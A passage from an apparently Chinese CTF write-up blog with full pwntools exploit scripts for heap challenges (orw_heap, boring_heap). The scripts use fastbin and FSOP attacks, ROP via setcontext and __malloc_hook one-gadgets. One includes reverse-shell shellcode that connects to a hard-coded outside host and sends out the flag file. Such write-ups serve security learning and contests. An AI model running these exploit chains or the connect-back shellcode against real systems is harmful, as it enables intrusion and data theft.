2</span></span><br><span class="line">    <span class="comment">#make overlapping chunk</span></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Delete(<span class="number">6</span>)<span class="comment">#delete init 0&amp;1</span></span><br><span class="line">    <span class="comment">#got 0x90*2 = 0x120 chunk</span></span><br><span class="line">    Add(<span class="number">7</span>,<span class="number">0x120</span><span class="number">-8</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+<span class="string">'\x00'</span>*<span class="number">0x50</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0x21</span>)*<span class="number">4</span>+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">7</span>)<span class="comment">#free chunk0 &amp; 1</span></span><br><span class="line">    Delete(<span class="number">6</span>)<span class="comment">#free chunk 1</span></span><br><span class="line">    <span class="comment">#use chunk0_1 the chunk 1</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">8</span>,<span class="number">0x120</span><span class="number">-8</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)+p64(<span class="number">0</span>)+p64(libc_base+<span class="number">0x7ffff7dd37f8</span><span class="number">-0x7ffff7a0d000</span><span class="number">-0x10</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#change global max_fast</span></span><br><span class="line">    Add(<span class="number">9</span>,<span class="number">0x98</span>,<span class="string">'\n'</span>)<span class="comment">#chunk1 overlap with chunk2</span></span><br><span class="line">    <span class="comment">#recover</span></span><br><span class="line">    Delete(<span class="number">8</span>)<span class="comment">#ini chunk0_1</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="number">10</span>,<span class="number">0x120</span><span class="number">-8</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x231</span>)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">6</span>)<span class="comment">#ini 1</span></span><br><span class="line">    Delete(<span class="number">10</span>)<span class="comment">#ini chunk0_1</span></span><br><span class="line">    <span class="comment">#fastbin attack</span></span><br><span class="line">    Add(<span class="number">11</span>,<span class="number">0x120</span><span class="number">-8</span>,<span class="string">'\x00'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x231</span>)+p64(heap_base)+<span class="string">'\n'</span>)</span><br><span class="line">    Add(<span class="number">12</span>,<span class="number">0x230</span><span class="number">-8</span>,<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># some gadgets</span></span><br><span class="line">    fio=heap_base+<span class="number">0x80</span></span><br><span class="line">    rdi=<span class="number">0x0000000000021102</span>+libc_base</span><br><span class="line">    rsi=<span class="number">0x00000000000202e8</span>+libc_base</span><br><span class="line">    rdx=<span class="number">0x0000000000001b92</span>+libc_base</span><br><span class="line">    syscall=<span class="number">0x00000000000bc375</span>+libc_base</span><br><span class="line">    rax=<span class="number">0x0000000000033544</span>+libc_base</span><br><span class="line">    add_rsp_100_ret = <span class="number">0x8e73e</span>+libc_base</span><br><span class="line">    set_context_addr = <span class="number">0x47b75</span>+libc_base</span><br><span class="line">    xor_rax_ret = <span class="number">0x000000000008b8c5</span>+libc_base</span><br><span class="line">    <span class="comment">#fake file</span></span><br><span class="line">    fake = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x61</span>)+p64(libc.sym[<span class="string">'system'</span>])+p64(libc.sym[<span class="string">'_IO_list_all'</span>]<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    fake = fake.ljust(<span class="number">0x68</span>,<span class="string">'\x00'</span>)+p64(heap_base+<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake = fake.ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0xff</span>)</span><br><span class="line">    fake = fake.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)+p64(fio+<span class="number">0x8</span>)+p64(add_rsp_100_ret)</span><br><span class="line">    fake = fake.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    fake = fake.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)+p64(fio+<span class="number">0xd8</span><span class="number">-0x10</span>)+p64(set_context_addr)+p64(<span class="number">0xdeadbeed</span>)</span><br><span class="line">    pay = [rax,<span class="number">2</span>,syscall,xor_rax_ret,rdi,<span class="number">4</span>,rsi,heap_base+<span class="number">0x200</span>,syscall,rax,<span class="number">1</span>,rdi,<span class="number">1</span>,syscall]</span><br><span class="line">    rop =flat(pay)</span><br><span class="line">    fake = fake.ljust(<span class="number">0x108</span>,<span class="string">'\x00'</span>)+rop</span><br><span class="line">    Add(<span class="number">13</span>,<span class="number">0x230</span><span class="number">-8</span>,<span class="string">"./flag"</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(heap_base+<span class="number">0x80</span>)+fake+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    Exit()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure></p>
<h2 id="UNCTF2019"><a href="#UNCTF2019" class="headerlink" title="UNCTF2019"></a>UNCTF2019</h2><h3 id="orw-heap"><a href="#orw-heap" class="headerlink" title="orw_heap"></a>orw_heap</h3><p>这道题是做完巅峰极客开始做的，跟那个非常像，也开了沙箱，只能orw，我的做法和之前的那题很像，最后FSOP劫持到setcontext+53，远程后面读不出来，sc我就改成了反弹shell，最后远程还是没读到flag，迷惑max，第二种解法是Ex师傅博客里的先泄露libc，再用ub踩出size到<strong>free_hook附近，从而可以劫持</strong>free_hook进行SROP最后ROP读flag。[<a href="http://blog.eonew.cn/archives/1243]" target="_blank" rel="noopener">http://blog.eonew.cn/archives/1243]</a></p>
<h4 id="exp-py-1"><a href="#exp-py-1" class="headerlink" title="exp.py"></a>exp.py</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    libc = ELF(<span class="string">"./x64_libc.so.6"</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./x64_libc.so.6'</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./x64_libc.so.6'</span>)</span><br><span class="line">    p = remote(<span class="string">'101.71.29.5'</span>,<span class="number">10005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input size: "</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input idx: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Please input idx: "</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Please input content: "</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0x88</span>,<span class="string">'\n'</span>)<span class="comment">#0 0</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'\n'</span>)<span class="comment">#1 1</span></span><br><span class="line">    Add(<span class="number">0x88</span>,<span class="string">'\n'</span>)<span class="comment">#2 2</span></span><br><span class="line">    Add(<span class="number">0x2f8</span>,<span class="string">'\n'</span>)<span class="comment">#3 3</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'\n'</span>)<span class="comment">#4 4</span></span><br><span class="line">    Delete(<span class="number">1</span>)<span class="comment"># 5</span></span><br><span class="line">    Delete(<span class="number">2</span>)<span class="comment"># 6</span></span><br><span class="line">    Delete(<span class="number">0</span>)<span class="comment"># 7</span></span><br><span class="line">    Add(<span class="number">0x88</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0x190</span>)+<span class="string">'\n'</span>)<span class="comment">#0 8</span></span><br><span class="line">    Delete(<span class="number">3</span>)<span class="comment"># 9</span></span><br><span class="line">    <span class="comment">#0 1 2 3</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x88</span>,<span class="string">'\n'</span>)<span class="comment">#1 10</span></span><br><span class="line">    <span class="comment">#overlap</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'\n'</span>)<span class="comment">#2 11</span></span><br><span class="line">    <span class="comment">#if debug:</span></span><br><span class="line">    <span class="comment">#without alsr</span></span><br><span class="line">    <span class="comment">#Edit(2,'\xdd\x25')#12</span></span><br><span class="line">    Edit(<span class="number">2</span>,<span class="string">'\xdd\x45'</span>)<span class="comment">#12</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'\n'</span>)<span class="comment">#3 13</span></span><br><span class="line">    Add(<span class="number">0xf8</span>,<span class="string">'\n'</span>)<span class="comment">#5 14</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(<span class="number">3</span>)<span class="comment"># 15</span></span><br><span class="line">    Delete(<span class="number">1</span>)<span class="comment"># 16</span></span><br><span class="line">    Add(<span class="number">0x78</span>,<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x30</span>+p64(<span class="number">0x190</span>)+<span class="string">'\n'</span>)<span class="comment">#1 17</span></span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">5</span>)<span class="comment"># 18</span></span><br><span class="line">    Add(<span class="number">0x2f8</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)[:<span class="number">-1</span>]+<span class="string">'\n'</span>)<span class="comment">#3 19</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'\n'</span>)<span class="comment">#5 20</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Delete(<span class="number">4</span>)<span class="comment"># 21</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">"\x00"</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\xff\n'</span>)<span class="comment">#4 22</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.recvn(<span class="number">0x39</span>)</span><br><span class="line">    libc_base = u64(p.recvn(<span class="number">8</span>)) - (<span class="number">0x7f8c1421bb25</span> - <span class="number">0x7f8c1408f000</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    raw_input()</span><br><span class="line">    <span class="comment">#p.recvn(0x1000-0xf-0x8)</span></span><br><span class="line">    p.recvn(<span class="number">0x1000</span><span class="number">-0x39</span><span class="number">-8</span>)</span><br><span class="line">    p.recvn(<span class="number">0x1000</span>)</span><br><span class="line">    p.recvn(<span class="number">0xe00</span>)</span><br><span class="line">    p.recvn(<span class="number">0xc81</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x300</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#gadgets</span></span><br><span class="line">    <span class="comment"># some gadgets</span></span><br><span class="line">    libc.address = libc_base</span><br><span class="line">    fio=heap_base+<span class="number">0x80</span></span><br><span class="line">    rdi=<span class="number">0x0000000000021102</span>+libc_base</span><br><span class="line">    rsi=<span class="number">0x00000000000202e8</span>+libc_base</span><br><span class="line">    rdx=<span class="number">0x0000000000001b92</span>+libc_base</span><br><span class="line">    syscall=<span class="number">0x00000000000bc375</span>+libc_base</span><br><span class="line">    rax=<span class="number">0x0000000000033544</span>+libc_base</span><br><span class="line">    add_rsp_100_ret = <span class="number">0x8e73e</span>+libc_base</span><br><span class="line">    set_context_addr = <span class="number">0x47b75</span>+libc_base</span><br><span class="line">    xor_rax_ret = <span class="number">0x000000000008b8c5</span>+libc_base</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    fio = heap_base+<span class="number">0x90</span></span><br><span class="line">    Edit(<span class="number">3</span>,<span class="string">'a'</span>*<span class="number">0x80</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>)+<span class="string">'\n'</span>)<span class="comment">#23</span></span><br><span class="line">    Delete(<span class="number">5</span>)<span class="comment">#24</span></span><br><span class="line">    fake_file = <span class="string">"/bin/sh\x00"</span>+p64(<span class="number">0x61</span>)+p64(<span class="number">0</span>)+p64(libc.sym[<span class="string">'_IO_list_all'</span>]<span class="number">-0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0x68</span>,<span class="string">'\x00'</span>)+p64(heap_base+<span class="number">0x10</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0x88</span>,<span class="string">'\x00'</span>)+p64(<span class="number">0xff</span>)</span><br><span class="line">    fake_file =fake_file.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)+p64(fio+<span class="number">0x8</span>)+p64(add_rsp_100_ret)</span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)+p64(<span class="number">1</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0xd8</span>,<span class="string">'\x00'</span>)+p64(fio+<span class="number">0xd8</span><span class="number">-0x10</span>)+p64(set_context_addr)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    <span class="comment">#normal</span></span><br><span class="line">    <span class="comment">#orw = [rax,2,syscall,xor_rax_ret,rdi,4,rsi,heap_base+0x400,syscall,rax,1,rdi,1,syscall,rax,1,rdi,2,syscall,rax,1,rdi,0,syscall,rdi,0,rax,60,syscall]</span></span><br><span class="line">    <span class="comment">#orw = [rax,2,syscall,xor_rax_ret,rdi,4,rsi,heap_base+0x400,syscall,rax,1,rdi,2,syscall,rdi,0,rax,60,syscall]</span></span><br><span class="line">    <span class="comment">#mprotect</span></span><br><span class="line">    orw = [rax,<span class="number">2</span>,syscall,xor_rax_ret,rdi,<span class="number">4</span>,rsi,heap_base+<span class="number">0x400</span>,syscall,rax,<span class="number">10</span>,rdi,heap_base,rsi,<span class="number">0x4000</span>,rdx,<span class="number">7</span>,syscall]</span><br><span class="line"></span><br><span class="line">    rop = flat(orw)</span><br><span class="line">    sc_start = heap_base+<span class="number">0x198</span>+len(rop)</span><br><span class="line">    log.success(str(len(rop)))</span><br><span class="line">    rop += p64(sc_start+<span class="number">8</span>)</span><br><span class="line">    sc = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            xor rdx,rdx;</span></span><br><span class="line"><span class="string">            mov rsi,1;</span></span><br><span class="line"><span class="string">            mov rdi,2;</span></span><br><span class="line"><span class="string">            mov rax,41;</span></span><br><span class="line"><span class="string">            syscall;</span></span><br><span class="line"><span class="string">            mov r12,0xa8726927;</span></span><br><span class="line"><span class="string">            push r12;</span></span><br><span class="line"><span class="string">            mov bx,0x3d0d;</span></span><br><span class="line"><span class="string">            push bx;</span></span><br><span class="line"><span class="string">            mov bx,0x2;</span></span><br><span class="line"><span class="string">            push bx;</span></span><br><span class="line"><span class="string">            mov rsi,rsp;</span></span><br><span class="line"><span class="string">            mov rdx,0x10;</span></span><br><span class="line"><span class="string">            mov rdi,rax;</span></span><br><span class="line"><span class="string">            push rax;</span></span><br><span class="line"><span class="string">            mov rax,42;</span></span><br><span class="line"><span class="string">            syscall;</span></span><br><span class="line"><span class="string">            pop rdi;</span></span><br><span class="line"><span class="string">            mov rsi,2;</span></span><br><span class="line"><span class="string">            mov rax,0x21;</span></span><br><span class="line"><span class="string">            syscall;</span></span><br><span class="line"><span class="string">            dec rsi;</span></span><br><span class="line"><span class="string">            mov rax,0x21;</span></span><br><span class="line"><span class="string">            syscall;</span></span><br><span class="line"><span class="string">            dec rsi;</span></span><br><span class="line"><span class="string">            mov rax,0x21;</span></span><br><span class="line"><span class="string">            syscall;</span></span><br><span class="line"><span class="string">            mov rdi,1;</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    sc += asm(<span class="string">'mov rsi, '</span>+hex(heap_base+<span class="number">0x400</span>))</span><br><span class="line">    sc += asm(<span class="string">'''</span></span><br><span class="line"><span class="string">            mov rdx,0xff;</span></span><br><span class="line"><span class="string">            mov rax,1;</span></span><br><span class="line"><span class="string">            syscall;</span></span><br><span class="line"><span class="string">            mov rdi,0;</span></span><br><span class="line"><span class="string">            mov rax,60;</span></span><br><span class="line"><span class="string">            syscall;</span></span><br><span class="line"><span class="string">            '''</span>)</span><br><span class="line">    rop += sc</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"length of rop is "</span>+ str(len(rop))</span><br><span class="line">    fake_file = fake_file.ljust(<span class="number">0x108</span>,<span class="string">'\x00'</span>)+rop</span><br><span class="line">    payload = <span class="string">'flag'</span></span><br><span class="line">    payload = payload.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    payload += <span class="string">'\x00'</span>*<span class="number">0x60</span>+p64(fio)+p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64(heap_base+<span class="number">0x90</span>)+fake_file+<span class="string">'\n'</span></span><br><span class="line">    Edit(<span class="number">3</span>,payload)<span class="comment"># 25</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'\n'</span>)<span class="comment"># 26</span></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        exp()</span></span><br><span class="line"><span class="string">        #gdb.attach(p)</span></span><br><span class="line"><span class="string">        raw_input()</span></span><br><span class="line"><span class="string">        Add(0x68,'\n')# 26</span></span><br><span class="line"><span class="string">        p.interactive()</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if debug:</span></span><br><span class="line"><span class="string">        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="string">        p = process('./pwn')</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        libc = ELF('./x64_libc.so.6')</span></span><br><span class="line"><span class="string">        p = remote('101.71.29.5',10005)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h2 id="上海市大学生网络安全大赛"><a href="#上海市大学生网络安全大赛" class="headerlink" title="上海市大学生网络安全大赛"></a>上海市大学生网络安全大赛</h2><h3 id="boring-heap"><a href="#boring-heap" class="headerlink" title="boring_heap"></a>boring_heap</h3><p>劫持到main_arena改top_chunk到malloc_hook附近最后get shell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'DEBUG'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> debug == <span class="number">1</span>:</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">elif</span> debug == <span class="number">2</span>:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>,env=&#123;<span class="string">'LD_PRELOAD'</span>:<span class="string">'./libc.so'</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">    p = remote(<span class="string">'8sdafgh.gamectf.com'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input Size:\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0x20</span>:</span><br><span class="line">        p.sendline(str(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> size == <span class="number">0x30</span>:</span><br><span class="line">        p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    <span class="keyword">elif</span> size == <span class="number">0x40</span>:</span><br><span class="line">        p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"size not illegal"</span></span><br><span class="line">    p.recvuntil(<span class="string">"Input Content:\n"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(index,offset,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which one do you want to update?"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Where you want to update?"</span>)</span><br><span class="line">    p.sendline(str(offset))</span><br><span class="line">    p.recvuntil(<span class="string">"Input Content:\n"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">View</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which one do you want to view?\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Which one do you want to delete?\n"</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="string">'0'</span>)<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x30</span>,<span class="string">'1'</span>)<span class="comment">#1</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="string">'2'</span>)<span class="comment">#2</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="string">'3'</span>)<span class="comment">#3</span></span><br><span class="line">    Update(<span class="number">1</span>,<span class="number">0x80000000</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">    Delete(<span class="number">1</span>)</span><br><span class="line">    Add(<span class="number">0x30</span>,<span class="string">'4'</span>)<span class="comment">#4 == 1</span></span><br><span class="line">    View(<span class="number">2</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">"\n"</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">88</span> - (libc.sym[<span class="string">"__malloc_hook"</span>]+<span class="number">0x10</span>)</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line">    main_arena = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>] + <span class="number">0x10</span></span><br><span class="line">    fake_chunk = main_arena + <span class="number">0x8</span> + <span class="number">0x5</span></span><br><span class="line">    log.info(<span class="string">"main arena =&gt; "</span> + hex(main_arena))</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="string">'5'</span>)<span class="comment">#5 == 2</span></span><br><span class="line">    Delete(<span class="number">2</span>)</span><br><span class="line">    Delete(<span class="number">3</span>)</span><br><span class="line">    Delete(<span class="number">5</span>)</span><br><span class="line">    Add(<span class="number">0x20</span>,<span class="string">'6'</span>)<span class="comment">#6</span></span><br><span class="line">    Delete(<span class="number">6</span>)</span><br><span class="line">    <span class="comment">#malloc to main_arena</span></span><br><span class="line">    Add(<span class="number">0x40</span>,p64(fake_chunk))<span class="comment">#7</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="string">'8'</span>)<span class="comment">#8</span></span><br><span class="line">    Add(<span class="number">0x40</span>,<span class="string">'9'</span>)<span class="comment">#9</span></span><br><span class="line">    payload = <span class="string">'\x00'</span>*<span class="number">3</span>+p64(main_arena+<span class="number">0x20</span>)+p64(<span class="number">0x51</span>)</span><br><span class="line">    Add(<span class="number">0x40</span>,payload)<span class="comment">#10</span></span><br><span class="line">    fake_malloc_chunk = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span></span><br><span class="line"></span><br><span class="line">    Add(<span class="number">0x40</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(fake_malloc_chunk))<span class="comment">#11</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">3</span>]</span><br><span class="line">    Add(<span class="number">0x30</span>,<span class="string">'\x00'</span>*<span class="number">8</span>+p64(shell_addr))</span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    p.recvuntil(<span class="string">'5.Exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Input Size:\n"</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exp()</span><br><span class="line">        p.interactive()</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">        p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = ELF(<span class="string">'./libc.so'</span>)</span><br><span class="line">        p = remote(<span class="string">'8sdafgh.gamectf.com'</span>,<span 